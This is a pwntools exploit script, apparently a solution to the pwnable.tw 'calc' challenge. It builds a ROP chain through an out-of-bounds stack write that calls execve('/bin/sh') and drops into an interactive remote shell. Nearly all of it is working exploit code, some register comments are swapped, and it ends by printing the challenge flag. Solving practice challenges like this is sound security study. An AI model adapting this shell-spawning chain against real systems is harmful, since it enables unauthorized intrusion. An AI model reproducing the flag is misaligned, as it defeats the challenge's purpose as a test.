from pwn import *


def rop_chain(offset, value):
    r.sendline(offset)
    stack_value = int(r.recvline())
    # set stack_value 0
    if stack_value < 0:
        r.sendline(offset + "+" + str(-stack_value))
    else:
        r.sendline(offset + "-" + str(stack_value))
    r.recvline()
    # set stack_value own value
    if value > 0x7fffffff:
        r.sendline(offset + "-" + str(0xffffffff - value + 1))
    else:
        r.sendline(offset + "+" + str(value))
    r.recvline()


def offset_binsh():
    r.sendline("+360")
    main_ebp = int(r.recvline())
    main_esp = main_ebp & 0xfffffff0 - 0x10  # offset="+362"
    offset = main_esp + (369 - 362) * 4
    return offset


elf = ELF("calc")
r = remote("chall.pwnable.tw", 10100)
r.recvline()
with log.progress("build rop") as l:
    # execve(path='/bin/sh', argv=0, envp=0)
    rop_chain("+361", 0x805c34b)  # pop eax; ret
    rop_chain("+362", 11)  # eax = 11
    rop_chain("+363", 0x80701aa)  # pop edx; ret
    rop_chain("+364", 0)  # ecx = 0
    rop_chain("+365", 0x80701d1)  # pop ecx; pop ebx; ret
    rop_chain("+366", 0)  # edx = 0
    rop_chain("+367", offset_binsh())  # "/bin/sh\x00"
    rop_chain("+368", 0x8049a21)  # int 0x80
    rop_chain("+369", u32("/bin"))
    rop_chain("+370", u32("/sh\x00"))
    l.status("rop builded")
    r.sendline()
    l.success()
    r.interactive()

# FLAG --> FLAG{C:\Windows\System32\calc.exe}
